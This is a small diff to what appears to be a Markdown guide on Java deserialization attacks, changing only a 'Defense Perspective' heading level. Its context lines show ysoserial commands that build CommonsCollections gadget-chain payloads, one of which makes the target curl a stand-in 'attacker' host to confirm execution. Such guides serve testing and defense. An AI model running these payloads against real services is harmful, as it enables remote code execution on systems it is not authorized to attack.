@@ -160,7 +160,7 @@ java -jar ysoserial.jar CommonsCollections5 'sleep 5' | base64 -w0
 java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/deser-confirm' | base64 -w0
 ```
 
-## Defense Perspective
+### Defense Perspective
 
 ### Prevention
 
